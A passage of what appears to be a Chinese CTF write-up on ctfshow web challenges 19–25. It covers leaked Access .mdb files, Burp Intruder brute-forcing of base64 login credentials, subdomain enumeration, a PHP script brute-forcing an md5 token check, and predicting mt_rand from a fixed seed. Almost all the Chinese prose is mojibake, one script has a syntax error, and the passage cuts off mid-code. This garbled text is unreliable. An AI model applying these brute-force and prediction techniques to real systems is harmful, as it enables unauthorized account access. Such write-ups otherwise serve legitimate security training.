alt="19">ÊòØÁî®post‰º†ÂÖ•ÁöÑÔºå<br><img src="https://img-blog.csdnimg.cn/103ae3bb049e418e98478720a13f1862.png" alt="19"><br>ÂæóÂà∞flag„ÄÇ</p><h4 id="Ê≥®ÊÑè"><a href="#Ê≥®ÊÑè" class="headerlink" title="Ê≥®ÊÑè"></a>Ê≥®ÊÑè</h4><p>Á¨¨‰∏ÄÂèçÂ∫îÁúãÂà∞ÊúâË¥¶Âè∑ÂØÜÁ†ÅÊó∂ÊàëÂ∞±Áõ¥Êé•ËæìÂÖ•‰∫ÜÔºåÈÇ£ËÇØÂÆöÊòØÈîôËØØÁöÑÔºåÂõ†‰∏∫ÊàëÊ≤°Êúâ‰ªîÁªÜÁúãÈ¢òÊÑè„ÄÇÈîô‰∫Ü‰πãÂêéÊâçÁü•ÈÅìÊòØpost‰º†ÂèÇ„ÄÇ<br><strong>ÂèçÁúÅÔºö‰∏ÄÂÆöË¶Å‰ªîÁªÜÂÆ°‰ª£Á†ÅÔºåËøôÂÖ≥‰πéÁùÄÊàêË¥•„ÄÇ</strong></p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><blockquote><p>ÊèêÁ§∫ÔºömdbÊñá‰ª∂ÊòØÊó©Êúüasp+accessÊûÑÊû∂ÁöÑÊï∞ÊçÆÂ∫ìÊñá‰ª∂ÔºåÊñá‰ª∂Ê≥ÑÈú≤Áõ∏ÂΩì‰∫éÊï∞ÊçÆÂ∫ìË¢´ËÑ±Ë£§‰∫Ü„ÄÇ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/41c86488b14649d38f44842262868a26.png" alt="20"></p><p>asp+accessÊúÄÂ§ßÁöÑÂÆâÂÖ®ÈöêÊÇ£Âú®‰∫éaccessÊï∞ÊçÆÂ∫ìÂèØ‰ª•Ë¢´Âà´‰∫∫‰∏ãËΩΩ„ÄÇ<br>mdbÊñá‰ª∂ÊòØÊó©Êúüasp+accessÊûÑÊû∂ÁöÑÊï∞ÊçÆÂ∫ìÊñá‰ª∂ Áõ¥Êé•Êü•ÁúãurlË∑ØÂæÑÊ∑ªÂä†&#x2F;db&#x2F;db.mdb ‰∏ãËΩΩÊñá‰ª∂ÈÄöËøátxtÊâìÂºÄÊàñËÄÖÈÄöËøáEasyAccess.exeÊâìÂºÄÊêúÁ¥¢flag</p><h4 id="ACCESSÊï∞ÊçÆÂ∫ìÁöÑÈöêÊÇ£"><a href="#ACCESSÊï∞ÊçÆÂ∫ìÁöÑÈöêÊÇ£" class="headerlink" title="ACCESSÊï∞ÊçÆÂ∫ìÁöÑÈöêÊÇ£"></a>ACCESSÊï∞ÊçÆÂ∫ìÁöÑÈöêÊÇ£</h4><h5 id="AccessÊï∞ÊçÆÂ∫ìÁöÑÂ≠òÂÇ®ÈöêÊÇ£"><a href="#AccessÊï∞ÊçÆÂ∫ìÁöÑÂ≠òÂÇ®ÈöêÊÇ£" class="headerlink" title="AccessÊï∞ÊçÆÂ∫ìÁöÑÂ≠òÂÇ®ÈöêÊÇ£"></a>AccessÊï∞ÊçÆÂ∫ìÁöÑÂ≠òÂÇ®ÈöêÊÇ£</h5><p>Âú®ASPÔºãAccessÂ∫îÁî®Á≥ªÁªü‰∏≠ÔºåÂ¶ÇÊûúËé∑ÂæóÊàñËÄÖÁåúÂà∞AccessÊï∞ÊçÆÂ∫ìÁöÑÂ≠òÂÇ®Ë∑ØÂæÑÂíåÊï∞ÊçÆÂ∫ìÂêçÔºåÂàôËØ•Êï∞ÊçÆÂ∫ìÂ∞±ÂèØ‰ª•Ë¢´‰∏ãËΩΩÂà∞Êú¨Âú∞„ÄÇ</p><h5 id="AccessÊï∞ÊçÆÂ∫ìÁöÑËß£ÂØÜÈöêÊÇ£"><a href="#AccessÊï∞ÊçÆÂ∫ìÁöÑËß£ÂØÜÈöêÊÇ£" class="headerlink" title="AccessÊï∞ÊçÆÂ∫ìÁöÑËß£ÂØÜÈöêÊÇ£"></a>AccessÊï∞ÊçÆÂ∫ìÁöÑËß£ÂØÜÈöêÊÇ£</h5><p>Áî±‰∫éAccessÊï∞ÊçÆÂ∫ìÁöÑÂä†ÂØÜÊú∫Âà∂ÈùûÂ∏∏ÁÆÄÂçïÔºåÊâÄ‰ª•Âç≥‰ΩøÊï∞ÊçÆÂ∫ìËÆæÁΩÆ‰∫ÜÂØÜÁ†ÅÔºåËß£ÂØÜ‰πüÂæàÂÆπÊòì„ÄÇËØ•Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÈÄöËøáÂ∞ÜÁî®Êà∑ËæìÂÖ•ÁöÑÂØÜÁ†Å‰∏éÊüê‰∏ÄÂõ∫ÂÆöÂØÜÈí•ËøõË°åÂºÇÊàñÊù•ÂΩ¢Êàê‰∏Ä‰∏™Âä†ÂØÜ‰∏≤ÔºåÂπ∂Â∞ÜÂÖ∂Â≠òÂÇ®Âú®Ôºä.mdbÊñá‰ª∂‰∏≠‰ªéÂú∞ÂùÄ‚ÄúÔºÜH42‚ÄùÂºÄÂßãÁöÑÂå∫ÂüüÂÜÖ„ÄÇÁî±‰∫éÂºÇÊàñÊìç‰ΩúÁöÑÁâπÁÇπÊòØ‚ÄúÁªèËøá‰∏§Ê¨°ÂºÇÊàñÂ∞±ÊÅ¢Â§çÂéüÂÄº‚ÄùÔºåÂõ†Ê≠§ÔºåÁî®Ëøô‰∏ÄÂØÜÈí•‰∏éÔºä.mdbÊñá‰ª∂‰∏≠ÁöÑÂä†ÂØÜ‰∏≤ËøõË°åÁ¨¨‰∫åÊ¨°ÂºÇÊàñÊìç‰ΩúÔºåÂ∞±ÂèØ‰ª•ËΩªÊùæÂú∞ÂæóÂà∞AccessÊï∞ÊçÆÂ∫ìÁöÑÂØÜÁ†Å„ÄÇÂü∫‰∫éËøôÁßçÂéüÁêÜÔºåÂèØ‰ª•ÂæàÂÆπÊòìÂú∞ÁºñÂà∂Âá∫Ëß£ÂØÜÁ®ãÂ∫è„ÄÇ</p><h5 id="Á®ãÂ∫èËÆæËÆ°‰∏≠ÁöÑÂÆâÂÖ®ÈöêÊÇ£"><a href="#Á®ãÂ∫èËÆæËÆ°‰∏≠ÁöÑÂÆâÂÖ®ÈöêÊÇ£" class="headerlink" title="Á®ãÂ∫èËÆæËÆ°‰∏≠ÁöÑÂÆâÂÖ®ÈöêÊÇ£"></a>Á®ãÂ∫èËÆæËÆ°‰∏≠ÁöÑÂÆâÂÖ®ÈöêÊÇ£</h5><p>ASP‰ª£Á†ÅÂà©Áî®Ë°®ÂçïÔºàformÔºâÂÆûÁé∞‰∏éÁî®Êà∑‰∫§‰∫íÁöÑÂäüËÉΩÔºåËÄåÁõ∏Â∫îÁöÑÂÜÖÂÆπ‰ºöÂèçÊò†Âú®ÊµèËßàÂô®ÁöÑÂú∞ÂùÄÊ†è‰∏≠ÔºåÂ¶ÇÊûú‰∏çÈááÁî®ÈÄÇÂΩìÁöÑÂÆâÂÖ®Êé™ÊñΩÔºåÂè™Ë¶ÅËÆ∞‰∏ãËøô‰∫õÂÜÖÂÆπÔºåÂ∞±ÂèØ‰ª•ÁªïËøáÈ™åËØÅÁõ¥Êé•ËøõÂÖ•Êüê‰∏ÄÈ°µÈù¢„ÄÇ‰æãÂ¶ÇÂú®ÊµèËßàÂô®‰∏≠Êï≤ÂÖ•‚Äú‚Ä¶‚Ä¶ page.asp?x&#x3D;1‚ÄùÔºåÂç≥ÂèØ‰∏çÁªèËøáË°®ÂçïÈ°µÈù¢Áõ¥Êé•ËøõÂÖ•Êª°Ë∂≥‚Äúx&#x3D;1‚ÄùÊù°‰ª∂ÁöÑÈ°µÈù¢„ÄÇÂõ†Ê≠§ÔºåÂú®ËÆæËÆ°È™åËØÅÊàñÊ≥®ÂÜåÈ°µÈù¢Êó∂ÔºåÂøÖÈ°ªÈááÂèñÁâπÊÆäÊé™ÊñΩÊù•ÈÅøÂÖçÊ≠§Á±ªÈóÆÈ¢òÁöÑÂèëÁîü„ÄÇ </p><h4 id="Ëß£ÂÜ≥ÊñπÊ°à"><a href="#Ëß£ÂÜ≥ÊñπÊ°à" class="headerlink" title="Ëß£ÂÜ≥ÊñπÊ°à"></a>Ëß£ÂÜ≥ÊñπÊ°à</h4><p>Ëá™Â∑±Âú®ÁΩë‰∏äÊêúÁ¥¢</p><h2 id="ÁàÜÁ†¥ÁØá"><a href="#ÁàÜÁ†¥ÁØá" class="headerlink" title="ÁàÜÁ†¥ÁØá"></a>ÁàÜÁ†¥ÁØá</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>ÊèêÁ§∫Ôºö<strong>ÁàÜÁ†¥‰ªÄ‰πàÁöÑÔºåÈÉΩÊòØÂü∫Êìç</strong><br><img src="https://img-blog.csdnimg.cn/50dec98ecd16438d95781995e710e7a3.png" alt="21"><br>Áªô‰∫Ü‰∏Ä‰∏™Â≠óÂÖ∏Êñá‰ª∂Ôºå‰øùÂ≠ò‰∏Ä‰∏ãË¶ÅÁî®Âà∞„ÄÇ<br>ÊâìÂºÄÈìæÊé•ÂêéËÆ©Êàë‰ª¨ËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÔºåÊòéÊòæÈúÄË¶ÅÁî®bpÊäìÂåÖ„ÄÇ<img src="https://img-blog.csdnimg.cn/2c342a9ab4b943a199bcd52181f7d1c2.png" alt="21"><br>Ë¢´Âä†ÂØÜ‰∫ÜÔºåbase64Ëß£ÂØÜÂêéÂæóÂà∞<strong>Áî®Êà∑:ÂØÜÁ†Å</strong><img src="https://img-blog.csdnimg.cn/dbf26459f49b4fb0bee29e0f9db2aed4.png" alt="21">OKÔºåÊàë‰ª¨sent to intruder<img src="https://img-blog.csdnimg.cn/612dc5429f6449928acd8dbb5fb6e1c4.png" alt="21">ËÆæÁΩÆÂ•ΩË¶ÅÁàÜÁ†¥ÁöÑÂÜÖÂÆπÔºåÂàáÊç¢Âà∞payloadsÈ°µÈù¢<img src="https://img-blog.csdnimg.cn/944254253a544554ac2bc595ad056408.png" alt="21"><br>Ê∑ªÂä†Á¨¨‰∏ÄÈÉ®ÂàÜÔºöÁî®Êà∑Âêç<img src="https://img-blog.csdnimg.cn/df3fba6b116e4dac8fb8bbd36de533ee.png" alt="21"><br>Ê∑ªÂä†Á¨¨‰∫åÈÉ®ÂàÜÔºö**:**ÔºàËã±ÊñáÁä∂ÊÄÅ‰∏ãÔºâ<img src="https://img-blog.csdnimg.cn/81b9ffed5f5a44618a64d6214facd8d4.png" alt="21">Ê∑ªÂä†Á¨¨‰∏âÈÉ®ÂàÜÔºöÂØÜÁ†ÅÔºåÁî®ÂàöÊâç‰∏ãËΩΩÁöÑÊñá‰ª∂Â≠óÂÖ∏„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/007a60a2824640ac90862574538a5351.png" alt="21">Âà´Âøò‰∫ÜÂÜçÁºñÁ†ÅÔºåÂõ†‰∏∫ÊäìÂåÖÊó∂Áî®Êà∑ÂØÜÁ†ÅË¢´Âä†ÂØÜ‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/fe997425d5384d519b2a115c77240b45.png" alt="21"><br>ÂèñÊ∂àÂãæÈÄâ<img src="https://img-blog.csdnimg.cn/3d0bcebe5ac64f0bb317a4d11aa12ade.png" alt="21"><br>ÂºÄÂßãÁàÜÁ†¥Ôºå<img src="https://img-blog.csdnimg.cn/da957508a007461b85eef29e440333e9.png" alt="21">ÂæóÂà∞ÂØÜÁ†ÅÔºåÁÑ∂ÂêéÂÜçbase64Ëß£Á†ÅÔºåÂæóÂà∞Áî®Êà∑ÂØÜÁ†ÅÔºåËæìÂÖ•‰πãÂêé‰æøÂèØÂæóÂà∞flag„ÄÇ<img src="https://img-blog.csdnimg.cn/eeb4c1d85335439da11f57fd4d455aac.png" alt="21"></p><h4 id="ÊÄùË∑ØÔºö"><a href="#ÊÄùË∑ØÔºö" class="headerlink" title="ÊÄùË∑ØÔºö"></a>ÊÄùË∑ØÔºö</h4><p>ÊäìÂåÖÂêéÊòØÂæóÂà∞Âä†ÂØÜÂêéÁöÑÁî®Êà∑ÂØÜÁ†ÅÔºåÁÑ∂ÂêéËß£ÂØÜÂêéÁúãÂà∞Áî®Êà∑ÂØÜÁ†ÅË¢´Âä†Â∑•‰∫Ü„ÄÇÂ∞ÜÊï∞ÊçÆÂèëÈÄÅÂà∞ÁàÜÁ†¥Ê®°ÂùóÔºåÈÄâ‰∏≠base64ÁºñÁ†ÅÂêéÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å„ÄÇÈÄâÊã©payloadsÔºåËÆæÁΩÆ‰∏∫custom iterator(Ëá™ÂÆö‰πâËø≠‰ª£Âô®)<strong>Ëá™ÂÆö‰πâËø≠‰ª£Âô®ÂèØ‰ª•Ëá™ÂÆö‰πâÊãºÊé•ÊñπÂºè</strong> positionÁöÑ‰ΩçÁΩÆÂç≥‰∏∫Êàë‰ª¨ÁöÑÊãºÊé•ÊñπÂºèÔºåÊ†πÊçÆ‰∏äËø∞base64Ëß£Á†ÅÁöÑtomcatÂØÜÁ†ÅÁöÑÊ†ºÂºèÔºöÁî®Êà∑Âêç:ÂØÜÁ†Å ‚Äî‚Äì&gt;ÂàôpositionÁöÑ‰ΩçÊï∞‰∏∫3„ÄÇ3‰∏™ÊãºÊé•ÂÆåÊàêÂêéÔºåÈúÄË¶ÅËøõË°åbase64ÁºñÁ†ÅÔºõ<strong>payload processing</strong> ËøõË°åÁºñÁ†ÅËÆæÁΩÆ„ÄÇÂèñÊ∂àPalyload EncodingÁºñÁ†Å„ÄÇÁÑ∂ÂêéÁàÜÁ†¥ÊàêÂäüÔºÅ</p><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>ÊèêÁ§∫Ôºö<strong>ÂüüÂêç‰πüÂèØ‰ª•ÁàÜÁ†¥ÁöÑÔºåËØïËØïÁàÜÁ†¥Ëøô‰∏™ctf.showÁöÑÂ≠êÂüüÂêç</strong></p><p><a href="https://phpinfo.me/domain">Êü•ËØ¢‰∏Ä‰∏ã‰ªñÁöÑÂ≠êÂüüÂêç</a>ÔºåÊúÄÂêéÂú®<strong>vip.ctf.show</strong>ÁöÑÊ∫ê‰ª£Á†Å‰∏≠ÁúãÂà∞‰∫Üflag„ÄÇ<img src="https://img-blog.csdnimg.cn/3dfd59da05a249dd989cea14e7f0d166.png" alt="22"></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><strong>ÊèêÁ§∫ÔºöËøòÁàÜÁ†¥ÔºüËøô‰πàÂ§ö‰ª£Á†ÅÔºåÂëäËæûÔºÅ</strong><br>Â•ΩÂÉèÊ≤°‰ªÄ‰πàÂçµÁî®„ÄÇÂæÄ‰∏ãÁúãÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 11:43:51# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 11:56:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂàÜÊûê‰∏Ä‰∏ã‰ª£Á†ÅÔºö<br>Â¶ÇÊûúÂ≠òÂú®‰∏Ä‰∏™tokenÂÄºÔºå‰∏îtokenÂÄºÊòØË¢´md5Âä†ÂØÜËøáÁöÑÔºåÂ¶ÇÊûúif‰∏≠ÁöÑÊù°‰ª∂Êª°Ë∂≥ÔºåÂàôÊâìÂç∞Âá∫flag„ÄÇÈúÄË¶Å‰º†ÈÄí‰∏Ä‰∏™ tokenÂÄºÔºåÂÜôËÑöÊú¨ÁàÜÁ†¥ÔºåÂú®ËøôÈáåÊàëÁî®PHPËØ≠Ë®ÄÔºåËÑöÊú¨Â¶Ç‰∏ãÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">10000</span><span class="token punctuation">:</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊÄùË∑ØÊòØÂõ†‰∏∫tokenÂ≠òÂú®‰∏Ä‰∏™Êï¥Êï∞ÂÄºÔºå‰ΩÜÁé∞Âú®‰∏çÁü•ÈÅìÊòØÂ§öÂ∞ëÔºåÊàëÂÅáËÆæÊòØÂú®10000‰πãÂÜÖÔºåËøêË°å‰∏Ä‰∏ãÔºåÂæóÂà∞<strong>422Âíå1202</strong>ÁÑ∂ÂêéÂú®urlÂêéÂä†‰∏ä <strong>?token&#x3D;1202</strong> Êàñ <strong>?token&#x3D;422</strong> ÂõûËΩ¶ÂêéÂæóÂà∞flag„ÄÇ<br><strong>ÊàëËÆ§‰∏∫‰ª•Âêé‰ºöÊúâÂæàÂ§öÈ¢òË¶ÅÁî®ËÑöÊú¨„ÄÇ</strong> ÊØîÂ¶ÇpythonÊòØ‰∏Ä‰∏™ÂæàÂ•ΩÁöÑÈÄâÊã©„ÄÇ</p><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 13:26:39# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 13:53:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mt_srandÈÄöËøáseedÁªômt_randÊí≠ÁßçÔºåÁÑ∂Âêémt_randÈÄöËøá<a href="https://baike.baidu.com/item/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95/22800014">Ê¢ÖÊ£ÆÊóãËΩ¨ÁÆóÊ≥ï</a>ÁîüÊàê‰º™ÈöèÊú∫Êï∞„ÄÇÂ¶ÇÊûúÊåáÂÆöseedÔºåÈÇ£‰πàmt_srandÊí≠Âá∫Êù•ÁöÑÁßçÂ≠êÊòØÂõ∫ÂÆöÁöÑÔºåmt_randÁîüÊàêÁöÑ‰º™ÈöèÊú∫Êï∞‰πüÊòØÂõ∫ÂÆöÁöÑÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/10e71b69aefc4ce6af505059950068dd.png" alt="24"><br>get‰º†ÂèÇ‰º†ÂÖ•?r&#x3D;1122388967,ÂæóÂà∞flag.</p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>ÊâìÂºÄÂêéÊúâ‰ª•‰∏ã‰ª£Á†Å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 13:56:57# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 15:47:33# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token 